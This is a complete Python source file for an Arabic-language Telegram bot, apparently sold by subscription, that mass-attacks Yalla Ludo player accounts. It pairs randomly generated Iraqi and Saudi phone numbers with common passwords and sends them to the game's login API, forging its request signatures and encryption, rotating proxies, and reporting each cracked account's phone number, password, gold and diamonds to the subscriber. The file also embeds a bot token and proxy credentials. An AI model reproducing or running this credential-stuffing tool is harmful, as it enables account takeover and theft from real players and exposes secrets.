import base64
import hashlib
import hmac as hmacmod
import html
import json
import os
import random
import string
import struct
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Dict, List, Optional

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import telebot
from telebot import types

# === إعدادات البروكسي الديناميكي ===
def get_proxy():
    """
    توليد إعدادات بروكسي جديدة لكل عملية طلب لضمان تغيير الـ IP مع كل فحص.
    """
    session_id = random.randint(10000, 999999)
    return {
        "http": "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823",
        "https": "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823",
    }

# === إعدادات البوت والمطور ===
TG_TOKEN = "8844579780:AAH_-8fTwYgelZgo-Q6JOK2trcqSMdorqZ0"
ADMIN_ID = 8795120325  # آيدي المطور

bot = telebot.TeleBot(TG_TOKEN)

# === إعدادات البروتوكول والأمان المتقدمة ===
version = '2.0'
b1key   = b'4e82797b276c5cb729db62aaa229a057'
b1iv    = b'0102030405060708'
secret  = 'L3)qk*@8'
api_url = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
ua      = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"

kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

# تخزين جلسات المشتركين بشكل مستقل تماماً
user_sessions: Dict[int, Dict[str, Any]] = {}
scan_threads = 5  # سرعة الفحص الافتراضية

# تخزين المشتركين: {user_id: expiry_timestamp}
subscribers: Dict[int, float] = {}
user_states: Dict[int, str] = {}

profile_path  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
profile_hosts = [
    "https://httpgateway.carrstuv.com",
    "https://httpgateway.planecde.com",
    "https://httpgateway.lampjkl.com",
    "https://httpgateway.funcdeg.com",
    "https://httpgateway.yalla.games",
]

# === دوال التشفير والتوقيع المتقدمة ===
def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if   i < 16: f = (b & c) | (~b & d); g = i
            elif i < 32: f = (d & b) | (~d & c); g = (5*i+1) % 16
            elif i < 48: f = b ^ c ^ d;           g = (3*i+5) % 16
            else:        f = c ^ (b | ~d);         g = (7*i)   % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d; d = c; c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0=(a0+a)&0xffffffff; b0=(b0+b)&0xffffffff
        c0=(c0+c)&0xffffffff; d0=(d0+d)&0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def encrypt_data(data, hera):
    k  = md5r(hera.encode() + secret.encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()

def sign_data(data, hera):
    key = md5r(hera.encode() + secret.encode()).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

def gendevice():
    device  = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars   = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce   = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return device, android, shumeng, nonce

def baggage(timestamp, device, android, shumeng, nonce, country="IQ"):
    obj = {
        "timeSpan": timestamp, "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
        "X-Phone-Country": country, "X-Sim-Country": country,
        "AndroidId": android, "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def buildrequest(body, country="IQ"):
    device, android, shumeng, nonce = gendevice()
    now    = int(time.time() * 1000)
    hera   = uuid.uuid4().hex
    bag    = baggage(str(now), device, android, shumeng, nonce, country)
    endpoint = '/' + '/'.join(api_url.split('/')[3:])
    signed = (endpoint + '' + ua + bag).encode('utf-8')

    xsign   = f'{version}_2_{sign_data(signed, hera)}'
    xmedusa = medusa(signed, hera)

    wire = json.dumps(
        {"paramJsonString": encrypt_data(body, hera)},
        separators=(',',':')
    ).encode('utf-8')

    headers = {
        'User-Agent': ua,
        'UserId': '0',
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': '',
        'X-Timestamp': str(now),
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': str(now),
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
    }
    return headers, wire, hera, device, android, shumeng, nonce

def build_payload(mobile, password, country="IQ"):
    device, android, shumeng, nonce = gendevice()
    area_code = "964" if country == "IQ" else "966"
    
    data = {
        "mobile": mobile, "areaCode": area_code, "password": password,
        "languageId": 2, "nationalityId": "1",
        "hostConfig": [
            {"bizType":5000,"countryCode":country,"hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
            {"bizType":1006,"countryCode":country,"hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
            {"bizType":1000,"countryCode":country,"hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
        ],
        "simCountry": country, "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "phoneModel": "SM-S918B",
        "X-Phone-Country": country, "X-Sim-Country": country,
        "AndroidId": android, "IsSubpackages": 0, "appType": 0, "idfa": "",
    }
    body_bytes = json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')
    headers, wire, hera, _, _, _, _ = buildrequest(body_bytes, country)
    return headers, wire, hera

def decode_resp(resp, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    param  = resp.get("paramJsonString", "")
    if not param:
        return resp
    raw = base64.b64decode(param)
    try:
        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
        return json.loads(xored.decode('utf-8'))
    except Exception:
        pass
    if hera:
        try:
            k  = md5r(hera.encode() + secret.encode()).encode()
            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
            dec = bytes(a ^ b for a, b in zip(raw, ks))
            return json.loads(dec.decode('utf-8'))
        except Exception:
            pass
    return resp

def profile_baggage(timestamp, token, hera, country="IQ"):
    device, android, shumeng, _ = gendevice()
    nc      = f'{random.randint(0, 2**31-1)}_{uuid.uuid4()}'
    key_hex = md5r(hera.encode() + secret.encode())
    bsign   = hashlib.md5((key_hex + nc).encode()).hexdigest().upper()
    obj = {
        "token": token, "sign": bsign,
        "timeSpan": timestamp, "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nc,
        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
        "X-Phone-Country": country, "X-Sim-Country": country,
        "AndroidId": android, "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def fetch_profile(token, user_id, login_data=None, country="IQ"):
    uid  = int(user_id) if str(user_id).isdigit() else user_id
    srvs = []
    for hc in ((login_data or {}).get('hostConfig') or []):
        if hc.get('bizType') == 1006 and hc.get('hostUrl'):
            for u in hc['hostUrl'].split(','):
                u = u.strip().rstrip('/')
                if u and u not in srvs: srvs.append(u)
            break
    for s in profile_hosts:
        if s not in srvs: srvs.append(s)
    for srv in srvs:
        now    = int(time.time() * 1000)
        hera   = uuid.uuid4().hex
        bag    = profile_baggage(str(now), token, hera, country)
        signed = (profile_path + token + ua + bag).encode('utf-8')
        body   = json.dumps({'accountId': uid}, separators=(',',':')).encode('utf-8')
        wire   = json.dumps({"paramJsonString": encrypt_data(body, hera)}, separators=(',',':')).encode('utf-8')
        hdrs   = {
            'User-Agent': ua, 'UserId': str(user_id), 'X-App-Id': 'ludo',
            'X-Baggage': bag, 'X-Access-Token': token,
            'X-Timestamp': str(now), 'versionString': '1.5.1.0',
            'X-Sign': f'{version}_2_{sign_data(signed, hera)}',
            'X-Hera': hera, 'X-Time': str(now),
            'X-Medusa': medusa(signed, hera),
            'Content-Type': 'application/json; charset=utf-8',
        }
        try:
            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, proxies=get_proxy(), timeout=10)
            obj = decode_resp(r.json(), hera)
            if obj.get('status') == 0:
                data = obj.get('data') or {}
                base = data.get('baseInfo') or data
                if base.get('goldNum') is not None or base.get('diamondNum') is not None:
                    return data
        except Exception:
            continue
    return None

# === تنسيق تقرير الصيد الكامل للإرسال عبر تليجرام ===
def format_hit_message(data, mobile, password, country, prof):
    raw_name = data.get('name') or data.get('nickName', '—')
    name = html.escape(str(raw_name))
    uid  = data.get('showNumId') or data.get('id', '—')
    
    area_prefix = "+964" if country == "IQ" else "+966"
    country_label = "العراق 🇮🇶" if country == "IQ" else "السعودية 🇸🇦"

    lines = [
        "<b>تم صيد حساب جديد 🎯</b>",
        f"<b>الدولة :</b> {country_label}",
        f"<b>رقم الهاتف :</b> <code>{area_prefix}{mobile}</code>",
        f"<b>كلمة المرور :</b> <code>{password}</code>",
        f"<b>الاسم :</b> {name}",
    ]

    if prof:
        base  = prof.get('baseInfo') or prof
        game  = prof.get('gameInfo') or {}
        meds  = prof.get('medalCountInfo') or {}
        gold  = base.get('goldNum',         '—')
        dia   = base.get('diamondNum',       '—')
        lvl   = base.get('levelId',          '—')
        exp   = base.get('experience',       '—')
        mxp   = base.get('maxExp',           '—')
        royal = base.get('royalLevel',        0)
        vip   = '✅ نعم' if base.get('isVip') else '❌ لا'
        frz   = '🔴 مبند (Banned)' if base.get('freezeStatus') else '🟢 نشط (Active)'
        frame = base.get('avatarFrameId',    '—')
        pend  = base.get('pendant',          '—')
        npl   = base.get('nameplateNum',     '—')
        stars = base.get('startNum',         '—')
        tot   = game.get('totalCount',       '—')
        wp    = game.get('totalWinPercent',  '—')
        seg   = game.get('currentSegmentId', '—')
        segh  = game.get('highestSegmentId', '—')
        mg    = meds.get('goldCount',   0)
        ms    = meds.get('silverCount', 0)
        mc    = meds.get('copperCount', 0)
        if isinstance(wp, float): wp = f'{wp*100:.1f}%'

        lines.extend([
            f"<b>عدد الذهب :</b> {gold}",
            f"<b>عدد جواهر :</b> {dia}",
            f"<b>حالة الحساب :</b> {frz}",
        ])
    else:
        lines.append("⚠️ <i>الحساب طالب تحقق</i>")

    lines.append("\nBy - @aboodriad")
    return "\n".join(lines)

# === مولدات الأرقام للعراق والسعودية ===
def generate_iraq_number() -> str:
    # أرقام الهواتف العراقية الأساسية (آسياسيل، زين، كورك)
    prefixes = ["770", "771", "772", "773", "774", "780", "781", "782", "783", "790", "791", "792", "750", "751"]
    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))

def generate_saudi_number() -> str:
    # أرقام الهواتف السعودية الأساسية (STC, Mobily, Zain)
    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))

def generate_number(country: str) -> str:
    if country == "IQ":
        return generate_iraq_number()
    elif country == "SA":
        return generate_saudi_number()
    return generate_iraq_number()

def get_country_name_label(country: str) -> str:
    if country == "IQ":
        return "العراق 🇮🇶"
    elif country == "SA":
        return "السعودية 🇸🇦"
    return "العراق و السعودية (تلقائي) 🇮🇶🇸🇦"

def check_subscription(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    if user_id in subscribers:
        if time.time() < subscribers[user_id]:
            return True
        else:
            del subscribers[user_id]
    return False

def get_user_session(user_id: int) -> Dict[str, Any]:
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "is_running": False,
            "stop_event": threading.Event(),
            "thread": None,
            "valid_count": 0,
            "wrong_count": 0,
            "error_count": 0,
            "current_country": "MIX",  # تبديل تلقائي بين العراق والسعودية
            "tried": set(),
            "stats_lock": threading.Lock()
        }
    return user_sessions[user_id]

# === لوحات التحكم ===
def get_control_keyboard(user_id: int):
    session = get_user_session(user_id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    if not session["is_running"]:
        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (العراق & السعودية)", callback_data="start_check"))
    else:
        markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
    
    markup.add(
        types.InlineKeyboardButton("➕ تفعيل مشترك", callback_data="add_subscriber"),
        types.InlineKeyboardButton("➖ حذف مشترك", callback_data="del_subscriber"),
        types.InlineKeyboardButton("📋 عرض المشتركين", callback_data="list_subscribers"),
        types.InlineKeyboardButton("📢 إذاعة للمشتركين", callback_data="broadcast_msg"),
        types.InlineKeyboardButton(f"⚙️ سرعة الفحص (الثريدز): {scan_threads}", callback_data="set_threads")
    )
    return markup

def get_user_keyboard(user_id: int):
    session = get_user_session(user_id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    if not session["is_running"]:
        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (العراق & السعودية)", callback_data="start_check"))
    else:
        markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
    return markup

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    session = get_user_session(user_id)
    if user_id == ADMIN_ID:
        bot.reply_to(message, "أهلاً بك يا مطور البوت 👨‍💻\nاستخدم الأمر /admin للتحكم.")
        return
    
    if check_subscription(user_id):
        expiry = subscribers.get(user_id, 0)
        rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
        country_label = get_country_name_label(session["current_country"])
        text = (
            f"👋 <b>أهلاً بك عزيزي المشترك في بوت فحص يالا لودو.</b>\n\n"
            f"✅ اشتراكك <b>نشط</b>\n"
            f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
            f"🌐 وضع الفحص: <b>{country_label} (تلقائي)</b>\n"
            f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
            "تحكم بالفحص عبر الأزرار أدناه:"
        )
        bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_user_keyboard(user_id))
    else:
        bot.reply_to(message, "❌ <b>عذراً، لست مسجلاً أو انتهى اشتراكك.</b>\n\nيرجى التواصل مع المطور لتفعيل حسابك.", parse_mode="HTML")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ عذراً، هذا الأمر للمطور فقط.")
        return
    user_id = message.from_user.id
    session = get_user_session(user_id)
    country_label = get_country_name_label(session["current_country"])
    text = (
        "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
        f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
        f"وضع الفحص: <b>{country_label}</b>\n"
        f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
        "اختر أحد خيارات الإدارة أدناه:"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(user_id))

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    is_admin = (user_id == ADMIN_ID)
    session = get_user_session(user_id)

    if not is_admin and not check_subscription(user_id):
        bot.answer_callback_query(call.id, "❌ عذراً، انتهى اشتراكك أو ليس لديك صلاحية!", show_alert=True)
        return

    if call.data == "start_check":
        if session["is_running"]:
            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
            return
        
        session["current_country"] = "MIX"
        session["is_running"] = True
        session["stop_event"].clear()
        session["valid_count"] = 0
        session["wrong_count"] = 0
        session["error_count"] = 0
        session["tried"].clear()

        t = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, user_id, call.message.message_id))
        t.daemon = True
        t.start()
        session["thread"] = t

        bot.answer_callback_query(call.id, "✅ تم بدء الفحص التلقائي (العراق & السعودية)")
        markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
        bot.edit_message_text(
            f"🚀 <b>جاري فحص حسابات العراق 🇮🇶 والسعودية 🇸🇦 تلقائياً...</b>\n\n"
            f"✅ صيد (Valid): {session['valid_count']}\n"
            f"❌ خطأ (Wrong): {session['wrong_count']}\n"
            f"⚠️ أخطاء اتصال (Errors): {session['error_count']}",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="HTML",
            reply_markup=markup
        )

    elif call.data == "back_to_admin" and is_admin:
        country_label = get_country_name_label(session["current_country"])
        text = (
            "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
            f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
            f"وضع الفحص: <b>{country_label}</b>\n"
            f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
            "اختر أحد خيارات الإدارة أدناه:"
        )
        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_control_keyboard(user_id))

    elif call.data == "back_to_user":
        expiry = subscribers.get(user_id, 0)
        rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
        country_label = get_country_name_label(session["current_country"])
        text = (
            f"👋 <b>أهلاً بك عزيزي المشترك في بوت فحص يالا لودو.</b>\n\n"
            f"✅ اشتراكك <b>نشط</b>\n"
            f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
            f"🌐 وضع الفحص: <b>{country_label}</b>\n"
            f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
            "تحكم بالفحص عبر الأزرار أدناه:"
        )
        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_user_keyboard(user_id))

    elif call.data == "stop_check":
        if not session["is_running"]:
            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف لديك مسبقاً!")
            return
        session["is_running"] = False
        session["stop_event"].set()
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
        main_text = (
            f"🌐 <b>لوحة الفحص (متوقف 🛑)</b>\n\n"
            f"📊 <b>ملخص النتائج النهائية:</b>\n"
            f"✅ صيد (Valid): {session['valid_count']}\n"
            f"❌ خطأ (Wrong): {session['wrong_count']}\n"
            f"⚠️ أخطاء اتصال (Errors): {session['error_count']}\n\n"
            "اختر أحد الخيارات أدناه:"
        )
        markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
        bot.edit_message_text(main_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)

    elif call.data in ["add_subscriber", "del_subscriber", "list_subscribers", "broadcast_msg", "set_threads"] and is_admin:
        if call.data == "add_subscriber":
            user_states[user_id] = "add_subscriber"
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص وعدد الأيام بالتنسيق:\nمثال: <code>123456789 30</code>", parse_mode="HTML")
        elif call.data == "del_subscriber":
            user_states[user_id] = "del_subscriber"
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص المراد حذفه:")
        elif call.data == "list_subscribers":
            bot.answer_callback_query(call.id)
            if not subscribers:
                bot.send_message(call.message.chat.id, "📋 لا يوجد مشتركين حالياً.")
            else:
                now = time.time()
                subs_text = "📋 <b>قائمة المشتركين:</b>\n\n"
                for sub_id, expiry in list(subscribers.items()):
                    status = "منتهي ❌" if now > expiry else f"نشط ✅ (باقي {int((expiry - now)/86400)} يوم)"
                    subs_text += f"• <code>{sub_id}</code> — {status}\n"
                bot.send_message(call.message.chat.id, subs_text, parse_mode="HTML")
        elif call.data == "broadcast_msg":
            user_states[user_id] = "broadcast"
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "📢 أرسل رسالة الإذاعة لكل المشتركين:")
        elif call.data == "set_threads":
            user_states[user_id] = "set_threads"
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code>\nأرسل عدد الثريدز الجديد (1 إلى 100):", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.from_user.id in user_states)
def handle_admin_input(message):
    global scan_threads
    action = user_states.pop(message.from_user.id, None)
    if action == "add_subscriber":
        parts = message.text.strip().split()
        if parts and parts[0].isdigit():
            sub_id = int(parts[0])
            days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
            subscribers[sub_id] = time.time() + (days * 86400)
            bot.reply_to(message, f"✅ تم تفعيل المشترك <code>{sub_id}</code> لمدة {days} يوم.", parse_mode="HTML")
            try:
                bot.send_message(sub_id, f"🎉 <b>مبروك! تم تفعيل اشتراكك لمدة {days} يوم.</b>\nأرسل /start للبدء.", parse_mode="HTML")
            except Exception:
                pass
        else:
            bot.reply_to(message, "❌ تنسيق خاطئ. مثال: <code>123456789 30</code>", parse_mode="HTML")
    elif action == "del_subscriber":
        text = message.text.strip()
        if text.isdigit() and int(text) in subscribers:
            del subscribers[int(text)]
            bot.reply_to(message, f"🗑 تم حذف المشترك بنجاح.")
        else:
            bot.reply_to(message, "⚠️ الآيدي غير موجود.")
    elif action == "broadcast":
        success, failed = 0, 0
        for sub_id in subscribers:
            try:
                bot.send_message(sub_id, f"📢 <b>إذاعة عامة:</b>\n\n{message.text}", parse_mode="HTML")
                success += 1
            except Exception:
                failed += 1
        bot.reply_to(message, f"📢 تم الإرسال بنجاح إلى: {success} | فشل: {failed}")
    elif action == "set_threads":
        if message.text.strip().isdigit() and 1 <= int(message.text.strip()) <= 100:
            scan_threads = int(message.text.strip())
            bot.reply_to(message, f"⚙️ تم تحديث الثريدز إلى: <code>{scan_threads}</code>", parse_mode="HTML")
        else:
            bot.reply_to(message, "⚠️ أرسل رقماً صحيحاً بين 1 و 100.")

def run_checker_loop(chat_id, user_id, msg_id):
    session = get_user_session(user_id)
    passwords = [
        'Aa123123123', 'Aa12312300', 'Aa10002000', 'Aa100200300',
        'Aa100200', 'Aa10203040', 'Aa102030', 'As123123',
        'Aa11223344', 'Aa123456', 'Aa12345678', 'Ali112233',
        'Aa123456789', 'Ali100200', 'Ali20002000', 'Ahmed100200',
        'Ahmad123123', 'qwer1234', 'qwer4321', 'q1w2e3r4', '1q2w3e4r'
    ]

    def worker():
        while session["is_running"] and not session["stop_event"].is_set():
            # اختيار الدولة تلقائياً بشكل عشوائي لكل عملية فحص بين العراق والسعودية
            country = random.choice(["IQ", "SA"])
            mobile = generate_number(country)
            
            with session["stats_lock"]:
                if mobile in session["tried"]:
                    continue
                session["tried"].add(mobile)

            password = random.choice(passwords)
            password_hashed = md5upper(password)
            body = build_payload(mobile, password_hashed, country=country)
            headers, wire, hera = body

            try:
                response = requests.post(api_url, data=wire, headers=headers, proxies=get_proxy(), timeout=15)
                result = decode_resp(response.json(), hera)
            except Exception:
                with session["stats_lock"]:
                    session["error_count"] += 1
                continue

            with session["stats_lock"]:
                if not session["is_running"] or session["stop_event"].is_set():
                    break
                if result.get('status') == 0:
                    session["valid_count"] += 1
                    data = result.get('data') or {}
                    token = data.get('token', '')
                    uid = str(data.get('id') or data.get('showNumId') or '')
                    
                    prof = fetch_profile(token, uid, data, country)
                    hit_msg = format_hit_message(data, mobile, password, country, prof)
                    
                    try:
                        bot.send_message(chat_id, hit_msg, parse_mode="HTML")
                    except Exception:
                        pass
                else:
                    if result.get('status') is not None:
                        session["wrong_count"] += 1
                    else:
                        session["error_count"] += 1

    with ThreadPoolExecutor(max_workers=scan_threads) as executor:
        for _ in range(scan_threads):
            executor.submit(worker)
        
        while session["is_running"] and not session["stop_event"].is_set():
            for _ in range(30):
                if not session["is_running"] or session["stop_event"].is_set():
                    break
                time.sleep(0.1)
            
            if not session["is_running"] or session["stop_event"].is_set():
                break
                
            with session["stats_lock"]:
                status_text = (
                    f"🚀 <b>جاري فحص حسابات العراق 🇮🇶 والسعودية 🇸🇦 تلقائياً...</b>\n\n"
                    f"✅ صيد (Valid): {session['valid_count']}\n"
                    f"❌ خطأ (Wrong): {session['wrong_count']}\n"
                    f"⚠️ أخطاء اتصال (Errors): {session['error_count']}"
                )
            
            try:
                markup = get_control_keyboard(user_id) if user_id == ADMIN_ID else get_user_keyboard(user_id)
                bot.edit_message_text(status_text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=markup)
            except Exception:
                pass

if __name__ == "__main__":
    print("🤖 Bot is running automatically for Iraq (IQ) and Saudi Arabia (SA) with dynamic rotating proxies...")
    bot.infinity_polling()
